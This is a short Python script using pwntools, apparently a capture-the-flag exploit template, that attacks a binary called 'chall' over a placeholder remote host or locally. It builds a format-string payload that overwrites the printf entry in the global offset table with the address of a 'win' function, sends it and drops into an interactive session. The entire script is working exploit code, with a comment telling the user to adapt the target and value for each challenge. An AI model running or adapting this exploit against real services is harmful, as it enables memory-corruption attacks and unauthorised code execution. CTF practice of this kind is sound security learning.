#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./chall")
HOST, PORT = "HOST", 1337
FMT_OFFSET = 6

io = remote(HOST, PORT) if args.REMOTE else process(elf.path)

# Example: overwrite printf@GOT with win. Change target/value per challenge.
target = elf.got.get("printf", 0)
value = elf.sym.get("win", 0)
if not target or not value:
    log.error("Update target/value for this binary")

payload = fmtstr_payload(FMT_OFFSET, {target: value}, write_size="short")
io.sendlineafter(b"> ", payload)
io.interactive()

